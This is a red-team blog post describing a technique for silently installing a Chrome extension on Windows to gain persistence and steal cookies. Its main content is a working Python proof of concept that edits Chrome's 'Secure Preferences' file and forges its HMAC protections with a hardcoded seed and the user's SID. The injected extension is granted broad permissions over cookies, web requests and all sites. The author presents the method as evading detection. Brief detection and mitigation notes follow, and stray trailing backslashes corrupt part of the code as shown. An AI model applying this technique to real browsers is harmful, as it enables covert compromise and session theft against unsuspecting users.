# https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html

# [Syntax-Err0r](https://syntax-err0r.github.io/)

# **Silently Install Chrome Extension For Persistence**

![](https://syntax-err0r.github.io/assets/chrome_poc.gif)

### tl;dr [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#tldr)

I have identified a way to silently install a Chrome extension avoiding the “common” IOC’s attackers use today.

- no command line parameters
- persistent
- can be installed while in use but it wont re-load until chrome restarts so it is up to you if you want to kill chrome
- no registry edits

![](https://syntax-err0r.github.io/assets/cookie.gif)

### Introduction [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#introduction)

Since “browsers are the new lsass”, over the last few weeks I have been interested in how Chrome Extensions work and how an attacker or Red Teamers like myself could leverage these for persistence/cookie stealing/etc. Extensions like [cursed chrome](https://github.com/mandatoryprogrammer/CursedChrome) can be invaluable for post exploitation. However, the most difficult part is installing these extensions without direct GUI interaction. I came across a couple articles such as attackers using powershell to use the [–load-extension](https://unit42.paloaltonetworks.com/chromeloader-malware/) parameter at the command line or using [remote debbuging](https://posts.specterops.io/stalking-inside-of-your-chromium-browser-757848b67949). However, these seemed somewhat easy to “detect” because of the command line parameters and the PPID’s. Additionally, these are not persistent across sessions. I could hear my ex-coworker in the back of my mind saying “there’s gotta be a better way!”

So I began to dig into Chrome–I had all my debuggers ready in my FLARE VM. I was ready to tackle all the AES and DPAPI Google would throw at me! After a few hours, I realized all I would need was some parameters for an HMAC algorithm and JSON edits in 1 file. I have not seen anyone write about this other than a [research paper](https://www.cse.chalmers.se/~andrei/cans20.pdf) I came across while writing the PoC. I certainly did not see any “red team” blogs weaponizing it or anything like that so I hope this is somewhat new to most. I cannot imagine someone did not weaponize this already so I apologize if I burn a TTP.

### Methodology/Walkthrough [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#methodologywalkthrough)

My initial methodology was to inspect DLL’s related to Chrome to see if there was any obvious exports related to extensions. Additionally I wanted to debug Chrome to see what exactly happens when loading an extension (yes I know Chromium is open source but this is easier for me than reading gigantic code bases). After a bit of troubleshooting I thought about it and realized the EASIEST and LAZIEST way to identify what changes when Chrome loads an extension was just simple ProcMon. So I loaded up ProcMon and fired off Chrome and continued adding/removing extensions to see what files changed.

I identified one file continusouly was getting touched – “Secure Preferences” in %localappdata%\\Google\\Chrome\\User Data\\Default. The easiest way to check if this was really the “key” was to load an extension, copy the file off, unload it and close Chrome. I then copied the file back and replaced the old one. Sure enough when I loaded Chrome there was the extension! The next step was to identify what was being added to the file and what changed and it was only three main things.

The first change was the extensionId being added to the Extensions:Settings JSON blob. This JSON blob contains information about the extension such as API permissions, where its loaded from, version, etc. This is an easy addition to any Secure Preferences file.

![screenshot](https://syntax-err0r.github.io/assets/extension_settings.png)

The second change was under the Protection:Macs:Extensions:Settings JSON blob. This appeared to be a SHA256 hash of some sort. This is where I found the aformentioned research paper and its a problem they already solved. Chrome (I assume all Chromium browsers) takes an HMAC hash of the JSON values added for the extension with the user SID and a hard coded seed (yes you read that correctly)

![screenshot](https://syntax-err0r.github.io/assets/mac_settings.png)

The third change is the super\_mac value at the end of the file. This again, takes an HMAC hash of JSON blobs in the file plus the SID and a hard coded seed.

![screenshot](https://syntax-err0r.github.io/assets/super_mac.png)

The latter two values I think are supposed to be the “security” around this TTP and while I understand this is a difficult problem to solve on client software it was surprisingly easy to overcome.

### POC [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#poc)

- We will be using [Crux](https://github.com/mttaggart/crux) since its easy to use and install
- Crux Extension folder must be in C:\\Users\\Public\\Downloads
- You need the username and the SID of the account (for the SID leave off the last section i.e. -1001)
- I left out some information in this post/PoC so youll have to do your own research to fully automate/weaponize this, however the below PoC works on a personal windows machine with a chrome install

```
import hmac
import json
from collections import OrderedDict
import hashlib

#https://github.com/Pica4x6/SecurePreferencesFile
def removeEmpty(d):
    if type(d) == type(OrderedDict()):
        t = OrderedDict(d)
        for x, y in t.items():
            if type(y) == (type(OrderedDict())):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif(type(y) == type({})):
                if(len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

    elif type(d) == type([]):
        for x, y in enumerate(d):
            if type(y) == type(OrderedDict()):
                if len(y) == 0:
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type({})):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            elif (type(y) == type([])):
                if (len(y) == 0):
                    del d[x]
                else:
                    removeEmpty(y)
                    if len(y) == 0:
                        del d[x]
            else:
                if (not y) and (y not in [False, 0]):
                    del d[x]

#https://github.com/Pica4x6/SecurePreferencesFile
def calculateHMAC(value_as_string, path, sid, seed):
    if ((type(value_as_string) == type({})) or (type(value_as_string) == type(OrderedDict()))):
        removeEmpty(value_as_string)
    message = sid + path + json.dumps(value_as_string, separators=(',', ':'), ensure_ascii=False).replace('<', '\\u003C').replace(
        '\\u2122', '™')
    hash_obj = hmac.new(seed, message.encode("utf-8"), hashlib.sha256)

    return hash_obj.hexdigest().upper()

#https://github.com/Pica4x6/SecurePreferencesFile
def calc_supermac(json_file, sid, seed):
    # Reads the file
    json_data = open(json_file, encoding="utf-8")
    data = json.load(json_data, object_pairs_hook=OrderedDict)
    json_data.close()
    temp = OrderedDict(sorted(data.items()))
    data = temp

    # Calculates and sets the super_mac
    super_msg = sid + json.dumps(data['protection']['macs']).replace(" ", "")
    hash_obj = hmac.new(seed, super_msg.encode("utf-8"), hashlib.sha256)
    return hash_obj.hexdigest().upper()

def add_extension(user, sid):
    ###add json to file
    extension_json=r'{"active_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"commands":{},"content_settings":[],"creation_flags":38,"filtered_service_worker_events":{"webNavigation.onCompleted":[{}]},"first_install_time":"13364417633506288","from_webstore":false,"granted_permissions":{"api":["activeTab","cookies","debugger","webNavigation","webRequest","scripting"],"explicit_host":["\u003Call_urls>"],"manifest_permissions":[],"scriptable_host":[]},"incognito_content_settings":[],"incognito_preferences":{},"last_update_time":"13364417633506288","location":4,"newAllowFileAccess":true,"path":"C:\\Users\\Public\\Downloads\\extension","preferences":{},"regular_only_preferences":{},"service_worker_registration_info":{"version":"0.1.0"},"serviceworkerevents":["cookies.onChanged","webRequest.onBeforeRequest/s1"],"state":1,"was_installed_by_default":false,"was_installed_by_oem":false,"withholding_permissions":false}'

     #convert to ordereddict for calc and addition
    dict_extension=json.loads(extension_json, object_pairs_hook=OrderedDict)
    filepath="C:\\users\\{}\\appdata\\local\\Google\\Chrome\\User Data\\Default\\Secure Preferences".format(user)
    with open(filepath, 'rb') as f:
            data = f.read()
    f.close()
    data=json.loads(data,object_pairs_hook=OrderedDict)
    data["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"]=dict_extension
    ###calculate hash for [protect][mac]
    path="extensions.settings.eljagiodakpnjbaceijefgmidmpmfimg"
    #hardcoded seed
    seed=b'\xe7H\xf36\xd8^\xa5\xf9\xdc\xdf%\xd8\xf3G\xa6[L\xdffv\x00\xf0-\xf6rJ*\xf1\x8a!-&\xb7\x88\xa2P\x86\x91\x0c\xf3\xa9\x03\x13ihq\xf3\xdc\x05\x8270\xc9\x1d\xf8\xba\\O\xd9\xc8\x84\xb5\x05\xa8'\
    macs = calculateHMAC(dict_extension, path, sid, seed)\
    #add macs to json file\
    data["protection"]["macs"]["extensions"]["settings"]["eljagiodakpnjbaceijefgmidmpmfimg"]=macs\
    newdata=json.dumps(data)\
    with open(filepath, 'w') as z:\
            z.write(newdata)\
    z.close()\
    ###recalculate and replace super_mac\
    supermac=calc_supermac(filepath,sid,seed)\
    data["protection"]["super_mac"]=supermac\
    newdata=json.dumps(data)\
    with open(filepath, 'w') as z:\
            z.write(newdata)\
    z.close()\
\
if __name__ == "__main__":\
    user=input("What is the local user? ")\
    sid=input("What is the SID of the account? ")\
    add_extension(user, sid)\
```\
\
Note: While writing the PoC I realized someone wrote a [research paper](https://www.cse.chalmers.se/~andrei/cans20.pdf) on this topic it just has not widely be weaponized (that I know of). They had some PoC code for the HMAC I leveraged on [github](https://github.com/Pica4x6/SecurePreferencesFile)\
\
### Caveats [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#caveats)\
\
- I hardcoded some things and I purposefully made some “opsec mistakes”\
- “Secure Preferences” arent always in use, it could be the “Preferences” file ;)\
\
### Detections [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#detections)\
\
- Edits on the “Secure Preferences” or “Preferences” file not by Chrome processes (credit to waldo-IRC on this idea)\
- Identify anomalous chrome extension file locations\
- Low prevalence extensions\
\
### Mitigations [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#mitigations)\
\
- Use chrome’s extension allow list\
\
### Future Work [Anchor](https://syntax-err0r.github.io/Silently_Install_Chrome_Extension.html\#future-work)\
\
Below are some ideas I think could expand this TTP:\
\
- Automagically creating the extensionId’s based on the parameters given – done :)\
- BoF it\
- “Extension Stomping” (think module stomping but chrome extensions)